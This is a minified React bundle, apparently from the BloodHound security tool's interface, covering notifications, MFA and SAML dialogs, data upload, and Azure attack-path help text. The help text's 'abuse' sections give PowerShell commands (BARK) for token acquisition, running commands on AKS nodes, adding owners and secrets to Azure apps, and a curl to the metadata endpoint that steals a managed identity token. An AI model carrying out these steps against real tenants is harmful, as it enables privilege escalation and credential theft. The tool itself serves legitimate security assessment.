import{SnackbarProvider as e,useSnackbar as t}from"notistack";import r,{createContext as n,useReducer as o,useContext as a,useEffect as i,useState as s,useRef as c,Children as d,memo as l}from"react";import{jsx as h,jsxs as p,Fragment as u}from"react/jsx-runtime";import{IconButton as m,SvgIcon as b,FormGroup as y,FormControlLabel as g,Checkbox as w,Paper as f,Box as v,Typography as A,Link as S,Button as T,useTheme as k,Dialog as C,DialogTitle as P,DialogContent as D,DialogContentText as R,DialogActions as O,FormHelperText as M,Divider as I,Grid as x,TextField as G,Alert as j,TableContainer as E,Table as $,TableHead as N,TableRow as U,TableCell as _,TableBody as L,Skeleton as W,TablePagination as F,Avatar as z,Container as B,AlertTitle as V,Menu as K,LinearProgress as H,List as Z,ListItem as q,ListItemText as Y,Tooltip as J,CircularProgress as X,ListSubheader as Q,ListItemButton as ee,MenuItem as te,ListItemIcon as re,Switch as ne}from"@mui/material";import{FontAwesomeIcon as oe}from"@fortawesome/react-fontawesome";import{faTimes as ae,faDownload as ie,faArrowDown as se,faInbox as ce,faSync as de,faCheck as le,faUser as he,faUsers as pe,faDesktop as ue,faGlobe as me,faList as be,faSitemap as ye,faBox as ge,faCloud as we,faKey as fe,faCube as ve,faObjectGroup as Ae,faCog as Se,faBolt as Te,faBoxOpen as ke,faCubes as Ce,faLock as Pe,faWindowRestore as De,faServer as Re,faRobot as Oe,faClipboardList as Me,faGem as Ie,faPlus as xe,faMinus as Ge,faQuestion as je,faTrash as Ee,faBars as $e}from"@fortawesome/free-solid-svg-icons";import{makeStyles as Ne}from"@mui/styles";import{useForm as Ue,Controller as _e}from"react-hook-form";import Le from"@mui/styles/withStyles";import{DateTime as We}from"luxon";import Fe from"@mui/styles/makeStyles";import ze from"memoize-one";import{areEqual as Be,FixedSizeList as Ve}from"react-window";import Ke from"react-window-infinite-loader";import He from"clsx";import Ze from"js-client-library";import{useQuery as qe,useQueryClient as Ye,useMutation as Je}from"react-query";import Xe from"dompurify";import Qe from"react-markdown";import{useCombobox as et}from"downshift";import{createSlice as tt}from"@reduxjs/toolkit";var rt;!function(e){e.Add="add",e.Dismiss="dismiss",e.Remove="remove"}(rt||(rt={}));const nt=(e,t)=>t.type===rt.Add?[...e,t.value]:t.type===rt.Dismiss?e.map((e=>null===t.key||t.key===e.key?{...e,dismissed:!0}:{...e})):e.filter((e=>e.key!==t.key)),ot=n([]),at=n(null),it=e=>{const{closeSnackbar:r}=t();return h(m,{size:"small",color:"inherit",onClick:()=>r(e),children:h(b,{children:h(oe,{icon:ae})})})},st=({children:t})=>{const[r,n]=o(nt,[]);return h(ot.Provider,{value:r,children:h(at.Provider,{value:n,children:h(e,{action:it,children:t})})})},ct=()=>{const e=a(ot),t=a(at);return{notifications:e,addNotification:(e,r,n={})=>t(((e,t,r={})=>({type:rt.Add,value:{message:e,key:t||((new Date).getTime()+Math.random()).toString(),options:{...r,autoHideDuration:5e3},dismissed:!1}}))(e,r,n)),dismissNotification:e=>t((e=>({type:rt.Dismiss,key:e}))(e)),removeNotification:e=>t((e=>({type:rt.Remove,key:e}))(e))}};let dt=[];const lt=()=>{const{notifications:e,removeNotification:r}=ct(),{enqueueSnackbar:n,closeSnackbar:o}=t();return i((()=>{e.forEach((({key:e,message:t,options:a={},dismissed:i=!1})=>{var s;i?o(e):dt.includes(e)||(n(t,{key:e,...a,onClose:(e,t,r)=>{a.onClose&&a.onClose(e,t,r)},onExited:(e,t)=>{r(t),(e=>{dt=[...dt.filter((t=>e!==t))]})(t)}}),s=e,dt=[...dt,s])}))}),[e,o,n,r]),null},ht=Ne((e=>({root:{display:"flex",flexDirection:"column",marginBottom:e.spacing(2)}}))),pt=({groupTitle:e,handleCheckboxFilter:t,options:r})=>{const n=ht();return p("section",{className:n.root,children:[h("h3",{children:e}),h(y,{children:r.map(((e,r)=>h(g,{control:h(w,{role:"checkbox",onChange:t,name:e.name,color:"primary"}),label:e.label},r)))})]})},ut={sharphound:"SharpHound",azurehound:"AzureHound"},mt=({collectorType:e,version:t,checksum:r,onClickDownload:n=(()=>{}),onClickDownloadChecksum:o=(()=>{}),isLatest:a=!1,isDeprecated:i=!1})=>h(f,{children:p(v,{p:2,display:"flex",justifyContent:"space-between",flexWrap:"wrap",style:{rowGap:"1rem"},children:[p(v,{overflow:"hidden",children:[h(A,{variant:"h6",children:`${ut[e]} ${t} ${bt(a,i)}`.trim()}),p(A,{variant:"body1",children:["SHA-256: ",h(S,{component:"button",variant:"body1",onClick:()=>{o(e,t)},title:"Download Checksum",style:{verticalAlign:"baseline"},children:r})]})]}),h(v,{children:h(T,{"aria-label":`Download ${ut[e]} ${t} (.zip)`,variant:"outlined",color:"primary",onClick:()=>{n(e,t)},startIcon:h(oe,{"aria-hidden":"true",icon:ie,fixedWidth:!0}),children:`Download ${ut[e]} ${t} (.zip)`})})]})}),bt=(e,t)=>t?"(Deprecated)":e?"(Latest)":"",yt=({collectors:e})=>{const t=k();return h(v,{display:"grid",rowGap:t.spacing(2),children:e.map(((e,t)=>h(v,{children:h(mt,{collectorType:e.collectorType,version:e.version,checksum:e.checksum,isLatest:e.isLatest,isDeprecated:e.isDeprecated,onClickDownload:e.onClickDownload,onClickDownloadChecksum:e.onClickDownloadChecksum})},t)))})},gt=({open:e,title:t,text:r,onClose:n,isLoading:o,error:a})=>p(C,{open:e,fullWidth:!0,maxWidth:"sm",onClose:()=>n(!1),PaperProps:{"data-testid":"confirmation-dialog"},children:[h(P,{children:t}),h(D,{children:h(R,{children:r})}),p(O,{children:[a&&h(M,{error:!0,style:{margin:0},children:a}),h(T,{autoFocus:!0,color:"inherit",onClick:()=>n(!1),disabled:o,"data-testid":"confirmation-dialog_button-no",children:"No"}),h(T,{color:"primary",onClick:()=>n(!0),disabled:o,"data-testid":"confirmation-dialog_button-yes",children:"Yes"})]})]}),wt=({title:e,children:t,actionButton:r,...n})=>p("div",{...n,children:[e&&p(u,{children:[p(v,{display:"flex",justifyContent:"space-between",children:[h(A,{variant:"h1",children:e}),r]}),h(v,{mt:2,mb:4,children:h(I,{})})]}),t]}),ft=({error:e,onClose:t,onSubmit:r})=>{const n=k(),{control:o,handleSubmit:a,reset:i,formState:{errors:c}}=Ue({defaultValues:{name:"",metadata:void 0}}),[d,l]=s("");return p("form",{onSubmit:a(r),children:[h(D,{children:p(x,{container:!0,spacing:2,children:[h(x,{item:!0,xs:12,children:h(_e,{control:o,name:"name",rules:{required:"SAML Provider Name is required",pattern:{value:/^[a-z0-9]+(?:-[a-z0-9]+)*$/,message:'SAML Provider Name must be a valid URL slug (e.g., "saml-provider", "test-idp-01", "any-old-slug")'}},render:({field:e})=>h(G,{...e,id:"name",variant:"standard",fullWidth:!0,name:"name",label:"SAML Provider Name",error:!!c.name,helperText:c.name?.message||"Choose a name for your SAML Provider configuration"})})}),p(x,{item:!0,xs:12,children:[h(_e,{control:o,name:"metadata",rules:{required:"Metadata is required"},render:({field:e})=>h(v,{p:1,borderRadius:4,bgcolor:n.palette.grey[200],children:p(v,{display:"flex",flexDirection:"row",alignItems:"center",children:[p(T,{color:"inherit",component:"label",variant:"contained",disableElevation:!0,size:"small",sx:{px:"1em"},children:["Choose File",h("input",{hidden:!0,type:"file",accept:".xml",value:d,onChange:t=>{l(t.target.value),e.onChange(t.target.files)},onBlur:e.onBlur})]}),h(v,{ml:1,children:h(A,{variant:"body1",children:e.value?.[0]?e.value[0].name:"No file chosen"})})]})})}),h(M,{error:!!c.metadata,children:c.metadata?c.metadata.message:"Upload the Metadata file provided by your SAML Provider"})]}),e&&h(x,{item:!0,xs:12,children:h(j,{severity:"error",children:e})})]})}),p(O,{children:[h(T,{color:"inherit",onClick:()=>{t(),l(""),i()},"data-testid":"create-saml-provider-dialog_button-close",children:"Cancel"}),h(T,{type:"submit",color:"primary","data-testid":"create-saml-provider-dialog_button-save",children:"Submit"})]})]})},vt=({open:e,error:t,onClose:r,onSubmit:n})=>p(C,{open:e,onClose:r,fullWidth:!0,maxWidth:"sm",PaperProps:{"data-testid":"create-saml-provider-dialog"},children:[h(P,{children:"Create SAML Provider"}),h(ft,{error:t,onClose:r,onSubmit:n})]}),At=({headers:e,data:t,isLoading:r=!1,showPaginationControls:n=!1,paginationProps:o={page:1,rowsPerPage:10,count:10,onPageChange:()=>{},onRowsPerPageChange:()=>{}}})=>p(u,{children:[h(E,{children:p($,{children:[h(N,{children:h(U,{children:e.map(((e,t)=>h(_,{align:e.alignment,children:e.label},t)))})}),h(L,{children:r?h(U,{children:e.map(((e,t)=>h(_,{children:h(W,{})},t)))}):t?.map(((t,r)=>h(U,{children:t.map(((t,r)=>h(_,{align:e[r]?.alignment,children:t},r)))},r)))})]})}),n&&h(F,{rowsPerPageOptions:[5,10,25,100],component:"div",...o})]}),St=({open:e,onClose:t,onCancel:r,onSave:n,error:o,secret:a,onSecretChange:i,contentText:s})=>p(C,{open:e,onClose:t,maxWidth:"sm",fullWidth:!0,children:[h(P,{children:"Disable Multi-Factor Authentication?"}),p("form",{onSubmit:e=>{e.preventDefault(),n(a)},children:[p(D,{children:[h(R,{children:s}),h(G,{id:"secret",name:"secret",value:a,onChange:i,type:"password",label:"Password",variant:"outlined",margin:"dense",fullWidth:!0,autoFocus:!0,error:!!o,helperText:o})]}),p(O,{children:[h(T,{color:"inherit",onClick:r,children:"Cancel"}),h(T,{color:"primary",type:"submit",children:"Disable Multi-Factor Authentication"})]})]})]}),Tt=({open:e,onClose:t,setupKey:r})=>p(C,{open:e,onClose:t,PaperProps:{"data-testid":"setup-key-dialog"},children:[h(P,{children:"Multi-Factor Authentication Setup Key"}),h(D,{children:h(R,{"data-testid":"setup-key",children:r})}),h(O,{children:h(T,{type:"button",color:"inherit",autoFocus:!0,onClick:t,"data-testid":"setup-key-dialog_button-close",children:"Close"})})]}),kt=Le((e=>({root:{backgroundColor:"#fff",padding:e.spacing(1),borderRadius:e.shape.borderRadius,"&:hover":{backgroundColor:"#fff"}},label:{padding:0}})))(T),Ct=({open:e,onClose:t,onCancel:r,onSavePassword:n,onSaveOTP:o,onSave:a,QRCode:i,TOTPSecret:c,error:d})=>{const[l,m]=s(""),[b,y]=s(""),[g,w]=s(!1),[f,A]=s(!1),[S,k]=s(!1),M=()=>{t()};return p(u,{children:[p(C,{open:e,onClose:M,maxWidth:"sm",fullWidth:!0,TransitionProps:{onExited:()=>{m(""),y(""),w(!1),A(!1)}},PaperProps:{"data-testid":"enable-2fa-dialog"},children:[h(P,{children:g&&f?"Multi-Factor Authentication Configured Successfully":"Configure Multi-Factor Authentication"}),p("form",{onSubmit:async e=>{e.preventDefault(),g?f?a():await o(b).then((()=>{A(!0)})).catch((()=>{})):await n(l).then((()=>{w(!0)})).catch((()=>{}))},children:[p(D,{children:[!g&&!f&&p(u,{children:[h(R,{children:"To set up multi-factor authentication, you'll need to download an authenticator app."}),h(R,{children:"To get started, first enter your password."}),h(G,{name:"secret",type:"password",value:l,onChange:e=>{m(e.target.value)},"aria-label":"Password",label:"Password",variant:"outlined",margin:"dense",fullWidth:!0,autoFocus:!0,error:!!d,helperText:d,"data-testid":"enable-2fa-dialog_input-password"})]}),g&&!f&&h(u,{children:p(x,{container:!0,spacing:2,children:[p(x,{item:!0,xs:7,children:[p(R,{children:[h("strong",{children:"Step 1:"})," Visit your phone's App Store to download and install an authenticator app like Google Authenticator or Authy, then follow the app's instructions to set up an account with them."]}),p(R,{children:[h("strong",{children:"Step 2:"})," Use your authenticator app to scan the barcode and enter the 6-digit verification code. Alternatively, click the barcode to reveal a setup key for manual entry."]}),h(G,{name:"otp",type:"text",value:b,onChange:e=>{y(e.target.value)},"aria-label":"One-Time Password",label:"One-Time Password",variant:"outlined",margin:"dense",fullWidth:!0,autoFocus:!0,error:!!d,helperText:d,"data-testid":"enable-2fa-dialog_input-one-time-password"})]}),h(x,{item:!0,xs:5,children:h(v,{height:200,width:200,children:h(kt,{type:"button",variant:"outlined",color:"primary",disableElevation:!0,disableRipple:!0,disableFocusRipple:!0,disableTouchRipple:!0,title:"Click to reveal setup key",onClick:()=>{k(!0)},"data-testid":"enable-2fa-dialog_button-barcode",children:h("img",{src:i,height:"100%",alt:"QR Code for Configuring Multi-Factor Authentication"})})})})]})}),g&&f&&p(u,{children:[h(R,{children:"Next time you log in, you'll need to use your password and authentication code."}),h(R,{children:"If you lose your authentication code, you'll need to contact your account's Administrator to reset your password and then go through the multi-factor authentication setup again."})]})]}),h(O,{children:g&&f?h(u,{children:h(T,{color:"primary",onClick:M,"data-testid":"enable-2fa-dialog_button-close",children:"Close"})}):p(u,{children:[h(T,{color:"inherit",onClick:r,"data-testid":"enable-2fa-dialog_button-close",children:"Cancel"}),h(T,{color:"primary",type:"submit","data-testid":"enable-2fa-dialog_button-next",children:"Next"})]})})]})]}),h(Tt,{open:S,onClose:()=>k(!1),setupKey:c})]})},Pt=({onDrop:e})=>{const t=k(),r=c(null),[n,o]=s(!1),[a,i]=s(!1);return p(v,{height:300,borderRadius:1,border:2,px:20,position:"relative",display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",bgcolor:a||n?t.palette.grey[300]:t.palette.grey[200],color:t.palette.grey[600],borderColor:t.palette.grey[400],fontWeight:"bold",textAlign:"center",children:[h("input",{"data-testid":"ingest-file-upload",ref:r,type:"file",multiple:!0,onChange:t=>e(r.current?.files),hidden:!0}),h(oe,{icon:n?se:ce,size:"3x"}),h("p",{children:"Click here or drag and drop to upload files"}),h(v,{position:"absolute",width:"100%",height:"100%",onClick:e=>{r.current&&r.current.click()},onDragEnter:e=>{e.preventDefault(),o(!0)},onDragLeave:e=>{e.preventDefault(),o(!1)},onDragOver:e=>e.preventDefault(),onMouseEnter:e=>i(!0),onMouseLeave:e=>i(!1),onDrop:t=>{t.preventDefault(),e(t.dataTransfer.files),o(!1)}})]})};var Dt,Rt;!function(e){e[e.READY=0]="READY",e[e.UPLOADING=1]="UPLOADING",e[e.FAILURE=2]="FAILURE",e[e.DONE=3]="DONE"}(Dt||(Dt={})),function(e){e[e.ADD_FILES=0]="ADD_FILES",e[e.CONFIRMATION=1]="CONFIRMATION",e[e.UPLOAD=2]="UPLOAD"}(Rt||(Rt={}));const Ot=({file:e})=>e.errors?.length?p(v,{sx:{display:"flex",alignItems:"center",gap:1},children:[h(z,{sx:{bgcolor:"red",width:24,height:24},children:h(oe,{icon:ae,size:"xs",color:"white"})}),h("div",{children:e.errors.map(((e,t)=>h("div",{children:e},t)))})]}):e.status===Dt.UPLOADING?p(v,{sx:{display:"flex",alignItems:"center",gap:1},children:[h(v,{sx:{animation:"spin 2s linear infinite","@keyframes spin":{"0%":{transform:"rotate(0deg)"},"100%":{transform:"rotate(360deg)"}}},children:h(oe,{icon:de,size:"sm",color:"grey"})}),h("div",{children:"Uploading..."})]}):p(v,{sx:{display:"flex",alignItems:"center",gap:1},children:[h(z,{sx:{bgcolor:"green",width:24,height:24},children:h(oe,{icon:le,transform:"shrink-1",size:"xs",color:"white"})}),h("div",{children:e.status===Dt.READY?"Ready":"Done"})]}),Mt=({file:e,onRemove:t})=>p(x,{container:!0,width:"100%",minHeight:32,fontSize:12,borderLeft:1,borderRight:1,borderBottom:1,borderColor:"lightgray",children:[h(x,{item:!0,xs:6,sx:{display:"flex",alignItems:"center",paddingLeft:"4px"},children:e.file.name}),h(x,{item:!0,xs:5,sx:{display:"flex",alignItems:"center"},children:h(Ot,{file:e})}),e.status===Dt.READY&&h(x,{item:!0,xs:1,sx:{display:"flex",alignItems:"center",justifyContent:"end"},children:h(m,{onClick:t,sx:{"&:hover":{backgroundColor:"lightgray"},borderRadius:"2px",width:28,height:28,margin:"2px"},children:h(oe,{size:"xs",icon:ae})})})]}),It=["application/json"],xt=({files:e,open:t,submitDisabled:r,onClose:n,onAppendFiles:o,onRemoveFile:a,onUpload:i,onExited:c=(()=>{}),uploadMessage:d=""})=>{const[l,m]=s(Rt.ADD_FILES),b=()=>{n()};return p(C,{open:t,fullWidth:!0,maxWidth:"sm",TransitionProps:{onExited:()=>{m(Rt.ADD_FILES),c()}},children:[h(D,{children:p(u,{children:[l===Rt.ADD_FILES&&h(Pt,{onDrop:e=>{if(e&&e.length>0){const t=[...e].map((e=>{const t=(e=>{const t=[];return e.size>1e9&&t.push("File cannot be larger than 1 GB"),It.includes(e.type)||t.push("File must be valid JSON"),t})(e);return t.length>0?{file:e,errors:t,status:Dt.READY}:{file:e,status:Dt.READY}}));o(t)}}}),(l===Rt.CONFIRMATION||l===Rt.UPLOAD)&&h(v,{fontSize:20,marginBottom:5,children:d||"The following files will be uploaded and ingested into BloodHound. This cannot be undone."}),e.length>0&&p(v,{sx:{marginTop:1,marginBottom:1},children:[h(v,{sx:{backgroundColor:"black",color:"white",fontWeight:"bold",padding:"4px"},children:"Files"}),e.map(((e,t)=>h(Mt,{file:e,onRemove:()=>a(t)},t)))]}),l===Rt.CONFIRMATION&&h(v,{fontSize:20,marginTop:3,children:'Press "Upload" to continue.'})]})}),p(O,{children:[(l===Rt.ADD_FILES||l===Rt.CONFIRMATION)&&p(u,{children:[h(T,{autoFocus:!0,color:"inherit",onClick:b,"data-testid":"confirmation-dialog_button-no",children:"Cancel"}),h(T,{color:"primary",disabled:r,onClick:()=>{l===Rt.ADD_FILES?m(Rt.CONFIRMATION):l===Rt.CONFIRMATION&&(m(Rt.UPLOAD),i())},"data-testid":"confirmation-dialog_button-yes",children:"Upload"})]}),l===Rt.UPLOAD&&h(T,{color:"primary",onClick:b,disabled:r,"data-testid":"confirmation-dialog_button-yes",children:r?"Uploading Files":"Close"})]})]})};var Gt;!function(e){e[e.INVALID=-1]="INVALID",e[e.READY=0]="READY",e[e.RUNNING=1]="RUNNING",e[e.COMPLETE=2]="COMPLETE",e[e.CANCELED=3]="CANCELED",e[e.TIMED_OUT=4]="TIMED_OUT",e[e.FAILED=5]="FAILED",e[e.INGESTING=6]="INGESTING"}(Gt||(Gt={}));const jt={[-1]:"Invalid",0:"Ready",1:"Running",2:"Complete",3:"Canceled",4:"Timed Out",5:"Failed",6:"Ingesting"},Et=/(\d\d\d\d)-(\d||\d\d)-(\d||\d\d) (\d||\d\d):\d\d ..T \(GMT-\d\d\d\d\)/;var $t;!function(e){e.DATETIME="yyyy-MM-dd T ZZZZ '(GMT'ZZZ')'",e.TIME="T ZZZZ' (GMT'ZZZ')'",e.DATETIME_WITH_LINEBREAKS="yyyy-MM-dd '\n'T ZZZZ\n'(GMT'ZZZ')'",e.TIME_WITH_LINEBREAKS="T ZZZZ'\n(GMT'ZZZ')'"}($t||($t={}));const Nt=(e,t)=>{const r=We.fromISO(t).diff(We.fromISO(e),["minutes","days"]),n=Math.floor(r.minutes),o=Math.floor(r.days);return 1===o?"a day":o>=2?`${o} days`:1===n?`${n} minute`:`${n} minutes`},Ut="0001-01-01T00:00:00Z",_t=[{label:"User"},{label:"Start Time"},{label:"End Time"},{label:"Duration"},{label:"Status"},{label:"Status Message"}],Lt=({ingestJobs:e,paginationProps:t})=>{const r=e.sort(((e,t)=>t.id-e.id)).map(((e,t)=>[e.user_email_address,We.fromISO(e.start_time).toFormat($t.DATETIME_WITH_LINEBREAKS),e.end_time===Ut?"":We.fromISO(e.end_time).toFormat($t.DATETIME_WITH_LINEBREAKS),e.end_time===Ut?"":Nt(e.start_time,e.end_time),jt[e.status],e.status_message]));return h(f,{children:h(At,{headers:_t,data:r,showPaginationControls:!0,paginationProps:t})})},Wt=()=>h(B,{maxWidth:"xl",children:h(v,{py:2,children:p(j,{severity:"error",children:[h(V,{children:"Error"}),"An unexpected error has occurred. Please refresh the page and try again."]})})}),Ft=Fe((e=>({button:{fontSize:"1rem",height:"1rem",lineHeight:"1rem",padding:e.spacing(1.5),border:"none",boxSizing:"initial",borderRadius:e.shape.borderRadius,backgroundColor:e.palette.background.paper,color:e.palette.common.black,textTransform:"capitalize",minWidth:"initial","&:hover":{backgroundColor:e.palette.background.default,"@media (hover: none)":{backgroundColor:e.palette.background.default}}}}))),zt=({onClick:e,displayText:t,disabled:r})=>{const n=Ft();return h(T,{onClick:e,disabled:r,classes:{root:n.button},children:t})},Bt=({children:e,label:t})=>{const[r,n]=s(null),o=Boolean(r),a=()=>n(null);return p(u,{children:[h(zt,{onClick:e=>{n(e.currentTarget)},"aria-controls":o?`${t}-menu`:void 0,"aria-haspopup":"true","aria-expanded":o?"true":void 0,displayText:t}),h(K,{id:`${t}-menu`,open:o,anchorEl:r,onClose:a,MenuListProps:{"aria-labelledby":`${t}-button`},anchorOrigin:{vertical:"top",horizontal:"left"},transformOrigin:{vertical:"bottom",horizontal:"left"},children:d.map(e,(e=>h("div",{onClick:a,children:e})))})]})},Vt=Fe({container:{position:"absolute",top:0,left:0,right:0},progressRoot:{backgroundColor:"#6798b9","& .MuiLinearProgress-barColorPrimary":{backgroundColor:"#406f8e"}}}),Kt=({loading:e})=>{const t=Vt();return e?h("div",{className:t.container,children:h(H,{color:"primary",className:t.progressRoot})}):null},Ht={general:()=>h(A,{variant:"body2",children:"The Azure Kubernetes Service Contributor role grants full control of the target Azure Kubernetes Service Managed Cluster. This includes the ability to remotely fetch administrator credentials for the cluster as well as the ability to execute arbitrary commands on compute nodes associated with the AKS Managed Cluster."}),abuse:()=>p(u,{children:[h(A,{variant:"body2",children:"You can use BARK's Invoke-AzureRMAKSRunCommand function to execute commands on compute nodes associated with the target AKS Managed Cluster."}),h(A,{variant:"body2",children:"This function requires you to supply an Azure Resource Manager scoped JWT associated with the principal that has the privilege to execute commands on the cluster. There are several ways to acquire a JWT. For example, you may use BARK's Get-ARMTokenWithRefreshToken to acquire an Azure RM-scoped JWT by supplying a refresh token:"}),h(A,{component:"pre",children:'$ARMToken = Get-ARMTokenWithRefreshToken `\n    -RefreshToken "0.ARwA6WgJJ9X2qk…" `\n    -TenantID "contoso.onmicrosoft.com"'}),h(A,{variant:"body2",children:'Now you can use BARK\'s Invoke-AzureRMAKSRunCommand function to execute a command against the target AKS Managed Cluster. For example, to run a simple "whoami" command:'}),h(A,{component:"pre",children:'Invoke-AzureRMAKSRunCommand `\n    -Token $ARMToken `\n    -TargetAKSId "/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourcegroups/AKS_ResourceGroup/providers/Microsoft.ContainerService/managedClusters/mykubernetescluster" `\n    -Command "whoami"'}),h(A,{variant:"body2",children:"If the AKS Cluster or its associated Virtual Machine Scale Sets have managed identity assignments, you can use BARK's Invoke-AzureRMAKSRunCommand function to retrieve a JWT for the managed identity Service Principal like this:"}),h(A,{component:"pre",children:'Invoke-AzureRMAKSRunCommand `\n    -Token $ARMToken `\n    -TargetAKSId "/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourcegroups/AKS_ResourceGroup/providers/Microsoft.ContainerService/managedClusters/mykubernetescluster" `\n    -Command \'curl -i -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://graph.microsoft.com/&api-version=2019-08-01"\''}),h(A,{variant:"body2",children:"If successful, the output will include a JWT for the managed identity service principal."})]}),opsec:()=>h(A,{variant:"body2",children:"This will depend on which particular abuse you perform, but in general Azure will create a log event for each abuse."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.netspi.com/blog/technical/cloud-penetration-testing/extract-credentials-from-azure-kubernetes-service/",children:"Karl Fosaaen - How To Extract Credentials from Azure Kubernetes Service (AKS)"})]})},Zt={general:()=>h(A,{variant:"body2",children:"The ability to add other principals to an Azure security group"}),abuse:()=>p(u,{children:[h(A,{variant:"body2",children:"Via the Azure portal:"}),p(Z,{children:[h(q,{children:h(Y,{children:"Find the group in your tenant (Azure Active Directory -> Groups -> Find Group in list)"})}),h(q,{children:h(Y,{children:"Click the group from the list"})}),h(q,{children:h(Y,{children:'In the left pane, click "Members"'})}),h(q,{children:h(Y,{children:'At the top, click "Add members"'})}),h(q,{children:h(Y,{children:'Find the principals you want to add to the group and click them, then click "select" at the bottom'})}),h(q,{children:h(Y,{children:'You should see a message in the top right saying "Member successfully added"'})})]}),h(A,{variant:"body2",children:"Via PowerZure: Add-AzureADGroup -User [UPN] -Group [Group name]"})]}),opsec:()=>h(A,{variant:"body2",children:"The Azure activity log for the tenant will log who added what principal to what group, including the date and time."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#add-azureadgroup",children:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#add-azureadgroup"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://docs.microsoft.com/en-us/powershell/module/azuread/add-azureadgroupmember?view=azureadps-2.0-preview",children:"https://docs.microsoft.com/en-us/powershell/module/azuread/add-azureadgroupmember?view=azureadps-2.0-preview"})]})},qt={general:()=>p(u,{children:[h(A,{variant:"body2",children:"This edge is created during post-processing. It is created against all App Registrations and Service Principals within the same tenant when an Azure principal has one of the following Azure Active Directory roles:"}),h(A,{variant:"body2",children:p(Z,{children:[h(q,{children:h(Y,{children:"Hybrid Identity Administrator"})}),h(q,{children:h(Y,{children:"Partner Tier1 Support"})}),h(q,{children:h(Y,{children:"Partner Tier2 Support"})}),h(q,{children:h(Y,{children:"Directory Synchronization Accounts"})})]})}),h(A,{variant:"body2",children:"You will not see these privileges when auditing permissions against any of the mentioned objects when you use Microsoft tooling, including the Azure portal or any API."})]}),abuse:()=>p(u,{children:[h(A,{variant:"body2",children:"You can use BARK to add a new owner to the target object. The BARK function you use will depend on the target object type, but all of the functions follow a similar syntax."}),h(A,{variant:"body2",children:"These functions require you to supply an MS Graph-scoped JWT associated with the principal that has the privilege to add a new owner to your target object. There are several ways to acquire a JWT. For example, you may use BARK’s Get-GraphTokenWithRefreshToken to acquire an MS Graph-scoped JWT by supplying a refresh token:"}),h(A,{component:"pre",children:'$MGToken = Get-GraphTokenWithRefreshToken `\n    -RefreshToken "0.ARwA6WgJJ9X2qk…" `\n    -TenantID "contoso.onmicrosoft.com"'}),h(A,{variant:"body2",children:"To add a new owner to a Service Principal, use BARK's New-ServicePrincipalOwner function:"}),h(A,{component:"pre",children:'New-ServicePrincipalOwner `\n    -ServicePrincipalObjectId "082cf9b3-24e2-427b-bcde-88ffdccb5fad" `\n    -NewOwnerObjectId "cea271c4-7b01-4f57-932d-99d752bbbc60" `\n    -Token $Token'}),h(A,{variant:"body2",children:"To add a new owner to an App Registration, use BARK's New-AppOwner function:"}),h(A,{component:"pre",children:'New-AppOwner `\n    -AppObjectId "52114a0d-fa5b-4ee5-9a29-2ba048d46eee" `\n    -NewOwnerObjectId "cea271c4-7b01-4f57-932d-99d752bbbc60" `\n    -Token $Token'})]}),opsec:()=>h(u,{children:h(A,{variant:"body2",children:"Any time you add an owner to any Azure object, the AzureAD audit logs will create an event logging who added an owner to what object, as well as what the new owner added to the object was."})}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"})]})},Yt={general:()=>p(u,{children:[h(A,{variant:"body2",children:"Azure provides several systems and mechanisms for granting control of securable objects within Azure Active Directory, including tenant-scoped admin roles, object-scoped admin roles, explicit object ownership, and API permissions."}),h(A,{variant:"body2",children:'When a principal has been granted "Cloud App Admin" or "App Admin" against the tenant, that principal gains the ability to add new secrets to all Service Principals and App Registrations. Additionally, a principal that has been granted "Cloud App Admin" or "App Admin" against, or explicit ownership of a Service Principal or App Registration gains the ability to add secrets to that particular object.'})]}),abuse:()=>p(u,{children:[h(A,{variant:"body2",children:"There are several ways to perform this abuse, depending on what sort of access you have to the credentials of the object that holds this privilege against the target object. If you have an interactive web browser session for the Azure portal, it is as simple as finding the target App in the portal and adding a new secret to the object using the “Certificates & secrets” tab. Service Principals do not have this tab in the Azure portal but you can add secrets to them with the MS Graph API."}),h(A,{variant:"body2",children:"No matter what kind of control you have, you will be able to perform this abuse by using BARK’s New-AppRegSecret or New-ServicePrincipalSecret functions."}),p(A,{variant:"body2",children:["These functions require you to supply an MS Graph-scoped JWT associated with the principal that has the privilege to add a new secret to your target application. There are several ways to acquire a JWT. For example, you may use BARK’s Get-GraphTokenWithRefreshToken to acquire an MS Graph-scoped JWT by supplying a refresh token:",h(A,{component:"pre",children:'$MGToken = Get-GraphTokenWithRefreshToken -RefreshToken "0.ARwA6WgJJ9X2qk…" -TenantID "contoso.onmicrosoft.com"'})]}),p(A,{variant:"body2",children:["Then use BARK’s New-AppRegSecret to add a new secret to the target application:",h(A,{component:"pre",children:'New-AppRegSecret -AppRegObjectID "d878…" -Token $MGToken.access_token'})]}),p(A,{variant:"body2",children:["The output will contain the plain-text secret you just created for the target app:",h(A,{component:"pre",children:'PS /Users/andyrobbins> New-AppRegSecret -AppRegObjectID "d878…" -Token $MGToken.access_token Name Value ---- ----- AppRegSecretValue odg8Q~... AppRegAppId 4d31… AppRegObjectId d878…'})]}),p(A,{variant:"body2",children:["With this plain text secret, you can now acquire tokens as the service principal associated with the app. You can easily do this with BARK’s Get-MSGraphToken function:",h(A,{component:"pre",children:'PS /Users/andyrobbins> $SPToken = Get-MSGraphToken `-ClientID "4d31…" `-ClientSecret "odg8Q~..." `-TenantName "contoso.onmicrosoft.com" PS /Users/andyrobbins> 